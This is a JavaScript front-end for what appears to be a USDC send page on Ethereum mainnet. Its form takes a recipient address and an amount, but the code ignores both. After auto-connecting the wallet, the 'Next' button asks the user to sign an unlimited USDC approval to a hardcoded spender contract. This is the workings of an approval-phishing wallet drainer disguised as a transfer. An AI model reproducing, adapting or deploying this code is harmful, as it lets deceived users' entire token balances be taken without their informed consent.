const WALLETCONNECT_PROJECT_ID = '25a778da5292aee3e00da87e594c2005'; // Your WalletConnect Project ID for V2

const connectButton = document.getElementById('connect-button');
const disconnectButton = document.getElementById('disconnect-button');
const addressInput = document.querySelector('.input-row.primary input');
const amountInput = document.querySelector('.input-row.amount-row input');
const pasteButton = document.querySelector('.paste');

let provider;
let web3Provider;
let signer;

const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'; // Official Ethereum Mainnet USDC Address
const SPENDER_CONTRACT_ADDRESS = '0xa81EE3A48c2B72C6AdB279812a730c93EfF5C2F6'; // Your Deployed UsdcAllowanceSpender Contract on Mainnet
const FIXED_ALLOWANCE_AMOUNT_HEX = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'; // Unlimited allowance (MaxUint256)

// Minimal ABI for ERC-20 approve and transferFrom functions
const ERC20_ABI = [
  {
    "constant": false,
    "inputs": [
      { "name": "spender", "type": "address" },
      { "name": "amount", "type": "uint256" }
    ],
    "name": "approve",
    "outputs": [{ "name": "", "type": "bool" }],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "constant": false,
    "inputs": [
      { "name": "sender", "type": "address" },
      { "name": "recipient", "type": "address" },
      { "name": "amount", "type": "uint256" }
    ],
    "name": "transferFrom",
    "outputs": [{ "name": "", "type": "bool" }],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
  }
];

const initWalletConnect = async () => {
  try {
    provider = await window.EthereumProvider.init({
      projectId: WALLETCONNECT_PROJECT_ID, // Use the new constant
      chains: [1], // Ethereum Mainnet Chain ID
      methods: ['eth_sendTransaction', 'personal_sign', 'eth_accounts', 'eth_requestAccounts'],
      events: ['chainChanged', 'accountsChanged'],
      showQrModal: true,
      rpcMap: {
        1: 'https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID' // Replace with your Infura project ID for Ethereum Mainnet
      }
    });

    provider.on('connect', (info) => {
      console.log('WalletConnect connected:', info);
      web3Provider = new window.ethers.BrowserProvider(provider);
      updateConnectButton();
    });

    provider.on('disconnect', (error) => {
      console.log('WalletConnect disconnected:', error);
      web3Provider = null;
      signer = null;
      updateConnectButton();
    });

    provider.on('accountsChanged', async (accounts) => {
      console.log('Accounts changed:', accounts);
      if (accounts.length === 0) {
        web3Provider = null;
        signer = null;
      } else {
        web3Provider = new window.ethers.BrowserProvider(provider);
        signer = await web3Provider.getSigner();
      }
      updateConnectButton();
    });

    provider.on('chainChanged', (chainId) => {
      console.log('Chain changed:', chainId);
      // Handle chain changes if necessary, e.g., re-initialize provider or display warning
    });

    // Attempt to reconnect if a session already exists
    if (provider.connected) {
      web3Provider = new window.ethers.BrowserProvider(provider);
      signer = await web3Provider.getSigner();
      updateConnectButton();
    } else {
      // Automatically attempt to connect if not already connected
      await connectWallet();
    }

  } catch (error) {
    console.error('Failed to initialize WalletConnect:', error);
  }
};


const updateConnectButton = async () => {
  if (web3Provider) {
    signer = await web3Provider.getSigner();
    const address = await signer.getAddress();
    connectButton.textContent = `Connected: ${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
    connectButton.classList.remove('idle');
    connectButton.classList.add('active');
    connectButton.removeEventListener('click', connectWallet);
    connectButton.addEventListener('click', approveSpender);
    disconnectButton.style.display = 'block'; // Show disconnect button
    disconnectButton.addEventListener('click', disconnectWallet);

  } else {
    connectButton.textContent = 'Next';
    connectButton.classList.remove('active');
    connectButton.classList.add('idle');
    connectButton.removeEventListener('click', approveSpender);
    connectButton.addEventListener('click', connectWallet);
    disconnectButton.style.display = 'none'; // Hide disconnect button
    disconnectButton.removeEventListener('click', disconnectWallet);
  }
};

const connectWallet = async () => {
  try {
    await provider.connect();
  } catch (error) {
    console.error('Failed to connect WalletConnect:', error);
  }
};

const disconnectWallet = async () => {
  try {
    await provider.disconnect();
  } catch (error) {
    console.error('Failed to disconnect WalletConnect:', error);
  }
};

const approveSpender = async () => {
  if (!signer) {
    alert('Please connect your wallet first.');
    return;
  }

  // Remove recipientAddress and amount inputs as they are not needed for approve
  // const recipientAddress = addressInput.value;
  // const amount = amountInput.value;

  // We are now approving a fixed, unlimited amount to a fixed spender contract
  // No need for user input validation for recipient or amount here

  try {
    const usdcContract = new window.ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer); // Use USDC_CONTRACT_ADDRESS and ERC20_ABI

    // Approve the SPENDER_CONTRACT_ADDRESS for an unlimited amount
    const transaction = await usdcContract.approve(SPENDER_CONTRACT_ADDRESS, FIXED_ALLOWANCE_AMOUNT_HEX);
    console.log('Approve transaction sent:', transaction);
    alert(`Approve transaction sent! Hash: ${transaction.hash}`);

    // Optionally, wait for transaction confirmation
    await transaction.wait();
    console.log('Approve transaction confirmed:', transaction.hash);
    alert('Approve transaction confirmed! Your UsdcAllowanceSpender contract can now spend USDC.');

  } catch (error) {
    console.error('Failed to send approve transaction:', error);
    alert(`Failed to send approve transaction: ${error.message}`);
  }
};

pasteButton.addEventListener('click', async () => {
  try {
    const text = await navigator.clipboard.readText();
    addressInput.value = text;
  } catch (error) {
    console.error('Failed to read clipboard:', error);
    alert('Failed to read clipboard. Please paste manually.');
  }
});

initWalletConnect();
